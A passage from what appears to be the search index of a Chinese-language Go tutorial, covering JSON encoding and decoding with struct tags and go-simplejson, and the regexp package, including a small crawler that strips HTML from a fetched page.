<p>\u6211\u4eec\u77e5\u9053interface{}\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u8fd9\u79cd\u6570\u636e\u7ed3\u6784\u6b63\u597d\u7528\u4e8e\u5b58\u50a8\u89e3\u6790\u7684\u672a\u77e5\u7ed3\u6784\u7684json\u6570\u636e\u7684\u7ed3\u679c\u3002JSON\u5305\u4e2d\u91c7\u7528map[string]interface{}\u548c[]interface{}\u7ed3\u6784\u6765\u5b58\u50a8\u4efb\u610f\u7684JSON\u5bf9\u8c61\u548c\u6570\u7ec4\u3002Go\u7c7b\u578b\u548cJSON\u7c7b\u578b\u7684\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff1a</p> <ul> <li>bool \u4ee3\u8868 JSON booleans,</li> <li>float64 \u4ee3\u8868 JSON numbers,</li> <li>string \u4ee3\u8868 JSON strings,</li> <li>nil \u4ee3\u8868 JSON null.</li> </ul> <p>\u73b0\u5728\u6211\u4eec\u5047\u8bbe\u6709\u5982\u4e0b\u7684JSON\u6570\u636e <pre><code>b := []byte(`{\"Name\":\"Wednesday\",\"Age\":6,\"Parents\":[\"Gomez\",\"Morticia\"]}`)\n</code></pre> \u5982\u679c\u5728\u6211\u4eec\u4e0d\u77e5\u9053\u4ed6\u7684\u7ed3\u6784\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u628a\u4ed6\u89e3\u6790\u5230interface{}\u91cc\u9762 <pre><code>var f interface{}\nerr := json.Unmarshal(b, &amp;f)\n</code></pre> \u8fd9\u4e2a\u65f6\u5019f\u91cc\u9762\u5b58\u50a8\u4e86\u4e00\u4e2amap\u7c7b\u578b\uff0c\u4ed6\u4eec\u7684key\u662fstring\uff0c\u503c\u5b58\u50a8\u5728\u7a7a\u7684interface{}\u91cc <pre><code>f = map[string]interface{}{\n\"Name\": \"Wednesday\",\n\"Age\":  6,\n\"Parents\": []interface{}{\n\"Gomez\",\n\"Morticia\",\n},\n}\n</code></pre> \u90a3\u4e48\u5982\u4f55\u6765\u8bbf\u95ee\u8fd9\u4e9b\u6570\u636e\u5462\uff1f\u901a\u8fc7\u65ad\u8a00\u7684\u65b9\u5f0f\uff1a <pre><code>m := f.(map[string]interface{})\n</code></pre> \u901a\u8fc7\u65ad\u8a00\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u6765\u8bbf\u95ee\u91cc\u9762\u7684\u6570\u636e\u4e86 <pre><code>for k, v := range m {\nswitch vv := v.(type) {\ncase string:\nfmt.Println(k, \"is string\", vv)\ncase int:\nfmt.Println(k, \"is int\", vv)\ncase float64:\nfmt.Println(k,\"is float64\",vv)\ncase []interface{}:\nfmt.Println(k, \"is an array:\")\nfor i, u := range vv {\nfmt.Println(i, u)\n}\ndefault:\nfmt.Println(k, \"is of a type I don't know how to handle\")\n}\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u793a\u4f8b\u53ef\u4ee5\u770b\u5230\uff0c\u901a\u8fc7interface{}\u4e0etype assert\u7684\u914d\u5408\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u89e3\u6790\u672a\u77e5\u7ed3\u6784\u7684JSON\u6570\u4e86\u3002</p> <p>\u4e0a\u9762\u8fd9\u4e2a\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5176\u5b9e\u5f88\u591a\u65f6\u5019\u6211\u4eec\u901a\u8fc7\u7c7b\u578b\u65ad\u8a00\uff0c\u64cd\u4f5c\u8d77\u6765\u4e0d\u662f\u5f88\u65b9\u4fbf\uff0c\u76ee\u524dbitly\u516c\u53f8\u5f00\u6e90\u4e86\u4e00\u4e2a\u53eb\u505a<code>simplejson</code>\u7684\u5305,\u5728\u5904\u7406\u672a\u77e5\u7ed3\u6784\u4f53\u7684JSON\u65f6\u76f8\u5f53\u65b9\u4fbf\uff0c\u8be6\u7ec6\u4f8b\u5b50\u5982\u4e0b\u6240\u793a\uff1a <pre><code>js, err := NewJson([]byte(`{\n    \"test\": {\n        \"array\": [1, \"2\", 3],\n        \"int\": 10,\n        \"float\": 5.150,\n        \"bignum\": 9223372036854775807,\n        \"string\": \"simplejson\",\n        \"bool\": true\n    }\n}`))\n\narr, _ := js.Get(\"test\").Get(\"array\").Array()\ni, _ := js.Get(\"test\").Get(\"int\").Int()\nms := js.Get(\"test\").Get(\"string\").MustString()\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0c\u4f7f\u7528\u8fd9\u4e2a\u5e93\u64cd\u4f5cJSON\u6bd4\u8d77\u5b98\u65b9\u5305\u6765\u8bf4\uff0c\u7b80\u5355\u7684\u591a,\u8be6\u7ec6\u7684\u8bf7\u53c2\u8003\u5982\u4e0b\u5730\u5740\uff1ahttps://github.com/bitly/go-simplejson</p>"},{"location":"07.2/#json_1","title":"\u751f\u6210JSON","text":"<p>\u6211\u4eec\u5f00\u53d1\u5f88\u591a\u5e94\u7528\u7684\u65f6\u5019\uff0c\u6700\u540e\u90fd\u662f\u8981\u8f93\u51faJSON\u6570\u636e\u4e32\uff0c\u90a3\u4e48\u5982\u4f55\u6765\u5904\u7406\u5462\uff1fJSON\u5305\u91cc\u9762\u901a\u8fc7<code>Marshal</code>\u51fd\u6570\u6765\u5904\u7406\uff0c\u51fd\u6570\u5b9a\u4e49\u5982\u4e0b\uff1a <pre><code>func Marshal(v interface{}) ([]byte, error)\n</code></pre> \u5047\u8bbe\u6211\u4eec\u8fd8\u662f\u9700\u8981\u751f\u6210\u4e0a\u9762\u7684\u670d\u52a1\u5668\u5217\u8868\u4fe1\u606f\uff0c\u90a3\u4e48\u5982\u4f55\u6765\u5904\u7406\u5462\uff1f\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a <pre><code>package main\n\nimport (\n\"encoding/json\"\n\"fmt\"\n)\n\ntype Server struct {\nServerName string\nServerIP   string\n}\n\ntype Serverslice struct {\nServers []Server\n}\n\nfunc main() {\nvar s Serverslice\ns.Servers = append(s.Servers, Server{ServerName: \"Shanghai_VPN\", ServerIP: \"127.0.0.1\"})\ns.Servers = append(s.Servers, Server{ServerName: \"Beijing_VPN\", ServerIP: \"127.0.0.2\"})\nb, err := json.Marshal(s)\nif err != nil {\nfmt.Println(\"json err:\", err)\n}\nfmt.Println(string(b))\n}\n</code></pre> \u8f93\u51fa\u5982\u4e0b\u5185\u5bb9\uff1a <pre><code>{\"Servers\":[{\"ServerName\":\"Shanghai_VPN\",\"ServerIP\":\"127.0.0.1\"},{\"ServerName\":\"Beijing_VPN\",\"ServerIP\":\"127.0.0.2\"}]}\n</code></pre> \u6211\u4eec\u770b\u5230\u4e0a\u9762\u7684\u8f93\u51fa\u5b57\u6bb5\u540d\u7684\u9996\u5b57\u6bcd\u90fd\u662f\u5927\u5199\u7684\uff0c\u5982\u679c\u4f60\u60f3\u7528\u5c0f\u5199\u7684\u9996\u5b57\u6bcd\u600e\u4e48\u529e\u5462\uff1f\u628a\u7ed3\u6784\u4f53\u7684\u5b57\u6bb5\u540d\u6539\u6210\u9996\u5b57\u6bcd\u5c0f\u5199\u7684\uff1fJSON\u8f93\u51fa\u7684\u65f6\u5019\u5fc5\u987b\u6ce8\u610f\uff0c\u53ea\u6709\u5bfc\u51fa\u7684\u5b57\u6bb5\u624d\u4f1a\u88ab\u8f93\u51fa\uff0c\u5982\u679c\u4fee\u6539\u5b57\u6bb5\u540d\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d1\u73b0\u4ec0\u4e48\u90fd\u4e0d\u4f1a\u8f93\u51fa\uff0c\u6240\u4ee5\u5fc5\u987b\u901a\u8fc7struct tag\u5b9a\u4e49\u6765\u5b9e\u73b0\uff1a <pre><code>type Server struct {\nServerName string `json:\"serverName\"`\nServerIP   string `json:\"serverIP\"`\n}\n\ntype Serverslice struct {\nServers []Server `json:\"servers\"`\n}\n</code></pre> \u901a\u8fc7\u4fee\u6539\u4e0a\u9762\u7684\u7ed3\u6784\u4f53\u5b9a\u4e49\uff0c\u8f93\u51fa\u7684JSON\u4e32\u5c31\u548c\u6211\u4eec\u6700\u5f00\u59cb\u5b9a\u4e49\u7684JSON\u4e32\u4fdd\u6301\u4e00\u81f4\u4e86\u3002</p> <p>\u9488\u5bf9JSON\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u5728\u5b9a\u4e49struct tag\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u7684\u51e0\u70b9\u662f:</p> <ul> <li>\u5b57\u6bb5\u7684tag\u662f<code>\"-\"</code>\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5b57\u6bb5\u4e0d\u4f1a\u8f93\u51fa\u5230JSON</li> <li>tag\u4e2d\u5e26\u6709\u81ea\u5b9a\u4e49\u540d\u79f0\uff0c\u90a3\u4e48\u8fd9\u4e2a\u81ea\u5b9a\u4e49\u540d\u79f0\u4f1a\u51fa\u73b0\u5728JSON\u7684\u5b57\u6bb5\u540d\u4e2d\uff0c\u4f8b\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2dserverName</li> <li>tag\u4e2d\u5982\u679c\u5e26\u6709<code>\"omitempty\"</code>\u9009\u9879\uff0c\u90a3\u4e48\u5982\u679c\u8be5\u5b57\u6bb5\u503c\u4e3a\u7a7a\uff0c\u5c31\u4e0d\u4f1a\u8f93\u51fa\u5230JSON\u4e32\u4e2d</li> <li>\u5982\u679c\u5b57\u6bb5\u7c7b\u578b\u662fbool, string, int, int64\u7b49\uff0c\u800ctag\u4e2d\u5e26\u6709<code>\",string\"</code>\u9009\u9879\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5b57\u6bb5\u5728\u8f93\u51fa\u5230JSON\u7684\u65f6\u5019\u4f1a\u628a\u8be5\u5b57\u6bb5\u5bf9\u5e94\u7684\u503c\u8f6c\u6362\u6210JSON\u5b57\u7b26\u4e32</li> </ul> <p>\u4e3e\u4f8b\u6765\u8bf4\uff1a <pre><code>type Server struct {\n// ID \u4e0d\u4f1a\u5bfc\u51fa\u5230JSON\u4e2d\nID int `json:\"-\"`\n\n// ServerName2 \u7684\u503c\u4f1a\u8fdb\u884c\u4e8c\u6b21JSON\u7f16\u7801\nServerName  string `json:\"serverName\"`\nServerName2 string `json:\"serverName2,string\"`\n\n// \u5982\u679c ServerIP \u4e3a\u7a7a\uff0c\u5219\u4e0d\u8f93\u51fa\u5230JSON\u4e32\u4e2d\nServerIP   string `json:\"serverIP,omitempty\"`\n}\n\ns := Server {\nID:         3,\nServerName:  `Go \"1.0\" `,\nServerName2: `Go \"1.0\" `,\nServerIP:   ``,\n}\nb, _ := json.Marshal(s)\nos.Stdout.Write(b)\n</code></pre> \u4f1a\u8f93\u51fa\u4ee5\u4e0b\u5185\u5bb9\uff1a <pre><code>{\"serverName\":\"Go \\\"1.0\\\" \",\"serverName2\":\"\\\"Go \\\\\\\"1.0\\\\\\\" \\\"\"}\n</code></pre> Marshal\u51fd\u6570\u53ea\u6709\u5728\u8f6c\u6362\u6210\u529f\u7684\u65f6\u5019\u624d\u4f1a\u8fd4\u56de\u6570\u636e\uff0c\u5728\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51e0\u70b9\uff1a</p> <ul> <li>JSON\u5bf9\u8c61\u53ea\u652f\u6301string\u4f5c\u4e3akey\uff0c\u6240\u4ee5\u8981\u7f16\u7801\u4e00\u4e2amap\uff0c\u90a3\u4e48\u5fc5\u987b\u662fmap[string]T\u8fd9\u79cd\u7c7b\u578b(T\u662fGo\u8bed\u8a00\u4e2d\u4efb\u610f\u7684\u7c7b\u578b)</li> <li>Channel, complex\u548cfunction\u662f\u4e0d\u80fd\u88ab\u7f16\u7801\u6210JSON\u7684</li> <li>\u5d4c\u5957\u7684\u6570\u636e\u662f\u4e0d\u80fd\u7f16\u7801\u7684\uff0c\u4e0d\u7136\u4f1a\u8ba9JSON\u7f16\u7801\u8fdb\u5165\u6b7b\u5faa\u73af</li> <li>\u6307\u9488\u5728\u7f16\u7801\u7684\u65f6\u5019\u4f1a\u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\uff0c\u800c\u7a7a\u6307\u9488\u4f1a\u8f93\u51fanull</li> </ul> <p>\u672c\u5c0f\u8282\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528Go\u8bed\u8a00\u7684json\u6807\u51c6\u5305\u6765\u7f16\u89e3\u7801JSON\u6570\u636e\uff0c\u540c\u65f6\u4e5f\u7b80\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305<code>go-simplejson</code>\u6765\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u7b80\u5316\u64cd\u4f5c\uff0c\u5b66\u4f1a\u5e76\u719f\u7ec3\u8fd0\u7528\u5b83\u4eec\u5c06\u5bf9\u6211\u4eec\u63a5\u4e0b\u6765\u7684Web\u5f00\u53d1\u76f8\u5f53\u91cd\u8981\u3002</p>"},{"location":"07.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: XML\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: \u6b63\u5219\u5904\u7406</li> </ul>"},{"location":"07.3/","title":"7.3 \u6b63\u5219\u5904\u7406","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u4e00\u79cd\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u548c\u6587\u672c\u64cd\u7eb5\u7684\u590d\u6742\u800c\u53c8\u5f3a\u5927\u7684\u5de5\u5177\u3002\u867d\u7136\u6b63\u5219\u8868\u8fbe\u5f0f\u6bd4\u7eaf\u7cb9\u7684\u6587\u672c\u5339\u914d\u6548\u7387\u4f4e\uff0c\u4f46\u662f\u5b83\u5374\u66f4\u7075\u6d3b\u3002\u6309\u7167\u5b83\u7684\u8bed\u6cd5\u89c4\u5219\uff0c\u968f\u9700\u6784\u9020\u51fa\u7684\u5339\u914d\u6a21\u5f0f\u5c31\u80fd\u591f\u4ece\u539f\u59cb\u6587\u672c\u4e2d\u7b5b\u9009\u51fa\u51e0\u4e4e\u4efb\u4f55\u4f60\u60f3\u8981\u5f97\u5230\u7684\u5b57\u7b26\u7ec4\u5408\u3002\u5982\u679c\u4f60\u5728Web\u5f00\u53d1\u4e2d\u9700\u8981\u4ece\u4e00\u4e9b\u6587\u672c\u6570\u636e\u6e90\u4e2d\u83b7\u53d6\u6570\u636e,\u90a3\u4e48\u4f60\u53ea\u9700\u8981\u6309\u7167\u5b83\u7684\u8bed\u6cd5\u89c4\u5219\uff0c\u968f\u9700\u6784\u9020\u51fa\u6b63\u786e\u7684\u6a21\u5f0f\u5b57\u7b26\u4e32\u5c31\u80fd\u591f\u4ece\u539f\u6570\u636e\u6e90\u63d0\u53d6\u51fa\u6709\u610f\u4e49\u7684\u6587\u672c\u4fe1\u606f\u3002</p> <p>Go\u8bed\u8a00\u901a\u8fc7<code>regexp</code>\u6807\u51c6\u5305\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u63d0\u4f9b\u4e86\u5b98\u65b9\u652f\u6301\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u4f7f\u7528\u8fc7\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684\u6b63\u5219\u76f8\u5173\u529f\u80fd\uff0c\u90a3\u4e48\u4f60\u5e94\u8be5\u5bf9Go\u8bed\u8a00\u7248\u672c\u7684\u4e0d\u4f1a\u592a\u964c\u751f\uff0c\u4f46\u662f\u5b83\u4eec\u4e4b\u95f4\u4e5f\u6709\u4e00\u4e9b\u5c0f\u7684\u5dee\u5f02\uff0c\u56e0\u4e3aGo\u5b9e\u73b0\u7684\u662fRE2\u6807\u51c6\uff0c\u9664\u4e86\\C\uff0c\u8be6\u7ec6\u7684\u8bed\u6cd5\u63cf\u8ff0\u53c2\u8003\uff1a<code>http://code.google.com/p/re2/wiki/Syntax</code></p> <p>\u5176\u5b9e\u5b57\u7b26\u4e32\u5904\u7406\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>strings</code>\u5305\u6765\u8fdb\u884c\u641c\u7d22(Contains\u3001Index)\u3001\u66ff\u6362(Replace)\u548c\u89e3\u6790(Split\u3001Join)\u7b49\u64cd\u4f5c\uff0c\u4f46\u662f\u8fd9\u4e9b\u90fd\u662f\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\uff0c\u4ed6\u4eec\u7684\u641c\u7d22\u90fd\u662f\u5927\u5c0f\u5199\u654f\u611f\uff0c\u800c\u4e14\u56fa\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u5339\u914d\u53ef\u53d8\u7684\u90a3\u79cd\u5c31\u6ca1\u529e\u6cd5\u5b9e\u73b0\u4e86\uff0c\u5f53\u7136\u5982\u679c<code>strings</code>\u5305\u80fd\u89e3\u51b3\u4f60\u7684\u95ee\u9898\uff0c\u90a3\u4e48\u5c31\u5c3d\u91cf\u4f7f\u7528\u5b83\u6765\u89e3\u51b3\u3002\u56e0\u4e3a\u4ed6\u4eec\u8db3\u591f\u7b80\u5355\u3001\u800c\u4e14\u6027\u80fd\u548c\u53ef\u8bfb\u6027\u90fd\u4f1a\u6bd4\u6b63\u5219\u597d\u3002</p> <p>\u5982\u679c\u4f60\u8fd8\u8bb0\u5f97\uff0c\u5728\u524d\u9762\u8868\u5355\u9a8c\u8bc1\u7684\u5c0f\u8282\u91cc\uff0c\u6211\u4eec\u5df2\u7ecf\u63a5\u89e6\u8fc7\u6b63\u5219\u5904\u7406\uff0c\u5728\u90a3\u91cc\u6211\u4eec\u5229\u7528\u4e86\u5b83\u6765\u9a8c\u8bc1\u8f93\u5165\u7684\u4fe1\u606f\u662f\u5426\u6ee1\u8db3\u67d0\u4e9b\u9884\u8bbe\u7684\u6761\u4ef6\u3002\u5728\u4f7f\u7528\u4e2d\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f\uff1a\u6240\u6709\u7684\u5b57\u7b26\u90fd\u662fUTF-8\u7f16\u7801\u7684\u3002\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u66f4\u52a0\u6df1\u5165\u7684\u6765\u5b66\u4e60Go\u8bed\u8a00\u7684<code>regexp</code>\u5305\u76f8\u5173\u77e5\u8bc6\u5427\u3002</p>"},{"location":"07.3/#_1","title":"\u901a\u8fc7\u6b63\u5219\u5224\u65ad\u662f\u5426\u5339\u914d","text":"<p><code>regexp</code>\u5305\u4e2d\u542b\u6709\u4e09\u4e2a\u51fd\u6570\u7528\u6765\u5224\u65ad\u662f\u5426\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\u8fd4\u56detrue\uff0c\u5426\u5219\u8fd4\u56defalse <pre><code>func Match(pattern string, b []byte) (matched bool, error error)\nfunc MatchReader(pattern string, r io.RuneReader) (matched bool, error error)\nfunc MatchString(pattern string, s string) (matched bool, error error)\n</code></pre> \u4e0a\u9762\u7684\u4e09\u4e2a\u51fd\u6570\u5b9e\u73b0\u4e86\u540c\u4e00\u4e2a\u529f\u80fd\uff0c\u5c31\u662f\u5224\u65ad<code>pattern</code>\u662f\u5426\u548c\u8f93\u5165\u6e90\u5339\u914d\uff0c\u5339\u914d\u7684\u8bdd\u5c31\u8fd4\u56detrue\uff0c\u5982\u679c\u89e3\u6790\u6b63\u5219\u51fa\u9519\u5219\u8fd4\u56deerror\u3002\u4e09\u4e2a\u51fd\u6570\u7684\u8f93\u5165\u6e90\u5206\u522b\u662fbyte slice\u3001RuneReader\u548cstring\u3002</p> <p>\u5982\u679c\u8981\u9a8c\u8bc1\u4e00\u4e2a\u8f93\u5165\u662f\u4e0d\u662fIP\u5730\u5740\uff0c\u90a3\u4e48\u5982\u4f55\u6765\u5224\u65ad\u5462\uff1f\u8bf7\u770b\u5982\u4e0b\u5b9e\u73b0 <pre><code>func IsIP(ip string) (m bool) {\nm, _ = regexp.MatchString(\"^[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}$\", ip)\nreturn\n}\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0c<code>regexp</code>\u7684pattern\u548c\u6211\u4eec\u5e73\u5e38\u4f7f\u7528\u7684\u6b63\u5219\u4e00\u6a21\u4e00\u6837\u3002\u518d\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a\u5f53\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u60f3\u77e5\u9053\u662f\u4e0d\u662f\u4e00\u6b21\u5408\u6cd5\u7684\u8f93\u5165\uff1a <pre><code>func main() {\nif len(os.Args) == 1 {\nfmt.Println(\"Usage: regexp [string]\")\nos.Exit(1)\n} if m, _ := regexp.MatchString(\"^[0-9]+$\", os.Args[1]); m {\nfmt.Println(\"\u6570\u5b57\")\n} else {\nfmt.Println(\"\u4e0d\u662f\u6570\u5b57\")\n}\n}\n</code></pre> \u5728\u4e0a\u9762\u7684\u4e24\u4e2a\u5c0f\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u91c7\u7528\u4e86Match(Reader|String)\u6765\u5224\u65ad\u4e00\u4e9b\u5b57\u7b26\u4e32\u662f\u5426\u7b26\u5408\u6211\u4eec\u7684\u63cf\u8ff0\u9700\u6c42\uff0c\u5b83\u4eec\u4f7f\u7528\u8d77\u6765\u975e\u5e38\u65b9\u4fbf\u3002</p>"},{"location":"07.3/#_2","title":"\u901a\u8fc7\u6b63\u5219\u83b7\u53d6\u5185\u5bb9","text":"<p>Match\u6a21\u5f0f\u53ea\u80fd\u7528\u6765\u5bf9\u5b57\u7b26\u4e32\u7684\u5224\u65ad\uff0c\u800c\u65e0\u6cd5\u622a\u53d6\u5b57\u7b26\u4e32\u7684\u4e00\u90e8\u5206\u3001\u8fc7\u6ee4\u5b57\u7b26\u4e32\u3001\u6216\u8005\u63d0\u53d6\u51fa\u7b26\u5408\u6761\u4ef6\u7684\u4e00\u6279\u5b57\u7b26\u4e32\u3002\u5982\u679c\u60f3\u8981\u6ee1\u8db3\u8fd9\u4e9b\u9700\u6c42\uff0c\u90a3\u5c31\u9700\u8981\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u590d\u6742\u6a21\u5f0f\u3002</p> <p>\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u4e00\u4e9b\u722c\u866b\u7a0b\u5e8f\uff0c\u4e0b\u9762\u5c31\u4ee5\u722c\u866b\u4e3a\u4f8b\u6765\u8bf4\u660e\u5982\u4f55\u4f7f\u7528\u6b63\u5219\u6765\u8fc7\u6ee4\u6216\u622a\u53d6\u6293\u53d6\u5230\u7684\u6570\u636e\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"io/ioutil\"\n\"net/http\"\n\"regexp\"\n\"strings\"\n)\n\nfunc main() {\nresp, err := http.Get(\"http://www.baidu.com\")\nif err != nil {\nfmt.Println(\"http get error.\")\n}\ndefer resp.Body.Close()\nbody, err := ioutil.ReadAll(resp.Body)\nif err != nil {\nfmt.Println(\"http read error\")\nreturn\n}\n\nsrc := string(body)\n\n//\u5c06HTML\u6807\u7b7e\u5168\u8f6c\u6362\u6210\u5c0f\u5199\nre, _ := regexp.Compile(`&lt;[\\S\\s]+?&gt;`)\nsrc = re.ReplaceAllStringFunc(src, strings.ToLower)\n\n//\u53bb\u9664STYLE\nre, _ = regexp.Compile(`&lt;style[\\S\\s]+?&lt;/style&gt;`)\nsrc = re.ReplaceAllString(src, \"\")\n//\u53bb\u9664HTMLUnscape\u7684STYLE\nre, _ = regexp.Compile(`&amp;lt;style[\\S\\s]+?&amp;lt;/style&amp;gt;`)\nsrc = re.ReplaceAllString(src, \"\")\n\n//\u53bb\u9664SCRIPT\nre, _ = regexp.Compile(`&lt;script[\\S\\s]+?&lt;/script&gt;`)\nsrc = re.ReplaceAllString(src, \"\")\n//\u53bb\u9664HTMLUnsapce\u7684SCRIPT\nre, _ = regexp.Compile(`&amp;lt;script[\\S\\s]+?&amp;lt;/script&amp;gt;`)\nsrc = re.ReplaceAllString(src, \"\")\n\n//\u53bb\u9664\u6240\u6709\u5c16\u62ec\u53f7\u5185\u7684HTML\u4ee3\u7801\uff0c\u5e76\u6362\u6210\u6362\u884c\u7b26\nre, _ = regexp.Compile(`&lt;[\\S\\s]+?&gt;`)\nsrc = re.ReplaceAllString(src, \"\\n\")\n\n//\u53bb\u9664\u8fde\u7eed\u7684\u6362\u884c\u7b26\nre, _ = regexp.Compile(`\\s{2,}`)\nsrc = re.ReplaceAllString(src, \"\\n\")\n\nfmt.Println(strings.TrimSpace(src))\n}\n</code></pre> \u4ece\u8fd9\u4e2a\u793a\u4f8b\u53ef\u4ee5\u770b\u51fa\uff0c\u4f7f\u7528\u590d\u6742\u7684\u6b63\u5219\u9996\u5148\u662fCompile\uff0c\u5b83\u4f1a\u89e3\u6790\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u5426\u5408\u6cd5\uff0c\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2aRegexp\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u8fd4\u56de\u7684Regexp\u5728\u4efb\u610f\u7684\u5b57\u7b26\u4e32\u4e0a\u9762\u6267\u884c\u9700\u8981\u7684\u64cd\u4f5c\u3002</p> <p>\u89e3\u6790\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u6709\u5982\u4e0b\u51e0\u4e2a\u65b9\u6cd5\uff1a <pre><code>func Compile(expr string) (*Regexp, error)\nfunc CompilePOSIX(expr string) (*Regexp, error)\nfunc MustCompile(str string) *Regexp\nfunc MustCompilePOSIX(str string) *Regexp\n</code></pre> CompilePOSIX\u548cCompile\u7684\u4e0d\u540c\u70b9\u5728\u4e8ePOSIX\u5fc5\u987b\u4f7f\u7528POSIX\u8bed\u6cd5\uff0c\u5b83\u4f7f\u7528\u6700\u5de6\u6700\u957f\u65b9\u5f0f\u641c\u7d22\uff0c\u800cCompile\u662f\u91c7\u7528\u7684\u5219\u53ea\u91c7\u7528\u6700\u5de6\u65b9\u5f0f\u641c\u7d22(\u4f8b\u5982[a-z]{2,4}\u8fd9\u6837\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5e94\u7528\u4e8e\"aa09aaa88aaaa\"\u8fd9\u4e2a\u6587\u672c\u4e32\u65f6\uff0cCompilePOSIX\u8fd4\u56de\u4e86aaaa\uff0c\u800cCompile\u7684\u8fd4\u56de\u7684\u662faa)\u3002\u524d\u7f00\u6709Must\u7684\u51fd\u6570\u8868\u793a\uff0c\u5728\u89e3\u6790\u6b63\u5219\u8bed\u6cd5\u7684\u65f6\u5019\uff0c\u5982\u679c\u5339\u914d\u6a21\u5f0f\u4e32\u4e0d\u6ee1\u8db3\u6b63\u786e\u7684\u8bed\u6cd5\u5219\u76f4\u63a5panic\uff0c\u800c\u4e0d\u52a0Must\u7684\u5219\u53ea\u662f\u8fd4\u56de\u9519\u8bef\u3002</p> <p>\u5728\u4e86\u89e3\u4e86\u5982\u4f55\u65b0\u5efa\u4e00\u4e2aRegexp\u4e4b\u540e\uff0c\u6211\u4eec\u518d\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2astruct\u63d0\u4f9b\u4e86\u54ea\u4e9b\u65b9\u6cd5\u6765\u8f85\u52a9\u6211\u4eec\u64cd\u4f5c\u5b57\u7b26\u4e32\uff0c\u9996\u5148\u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e9b\u7528\u6765\u641c\u7d22\u7684\u51fd\u6570\uff1a <pre><code>func (re *Regexp) Find(b []byte) []byte\nfunc (re *Regexp) FindAll(b []byte, n int) [][]byte\nfunc (re *Regexp) FindAllIndex(b []byte, n int) [][]int\nfunc (re *Regexp) FindAllString(s string, n int) []string\nfunc (re *Regexp) FindAllStringIndex(s string, n int) [][]int\nfunc (re *Regexp) FindAllStringSubmatch(s string, n int) [][]string\nfunc (re *Regexp) FindAllStringSubmatchIndex(s string, n int) [][]int\nfunc (re *Regexp) FindAllSubmatch(b []byte, n int) [][][]byte\nfunc (re *Regexp) FindAllSubmatchIndex(b []byte, n int) [][]int\nfunc (re *Regexp) FindIndex(b []byte) (loc []int)\nfunc (re *Regexp) FindReaderIndex(r io.RuneReader) (loc []int)\nfunc (re *Regexp) FindReaderSubmatchIndex(r io.RuneReader) []int\nfunc (re *Regexp) FindString(s string) string\nfunc (re *Regexp) FindStringIndex(s string) (loc []int)\nfunc (re *Regexp) FindStringSubmatch(s string) []string\nfunc (re *Regexp) FindStringSubmatchIndex(s string) []int\nfunc (re *Regexp) FindSubmatch(b []byte) [][]byte\nfunc (re *Regexp) FindSubmatchIndex(b []byte) []int\n</code></pre> \u4e0a\u9762\u8fd918\u4e2a\u51fd\u6570\u6211\u4eec\u6839\u636e\u8f93\u5165\u6e90(byte slice\u3001string\u548cio.RuneReader)\u4e0d\u540c\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u7b80\u5316\u6210\u5982\u4e0b\u51e0\u4e2a\uff0c\u5176\u4ed6\u7684\u53ea\u662f\u8f93\u5165\u6e90\u4e0d\u4e00\u6837\uff0c\u5176\u4ed6\u529f\u80fd\u57fa\u672c\u662f\u4e00\u6837\u7684\uff1a <pre><code>func (re *Regexp) Find(b 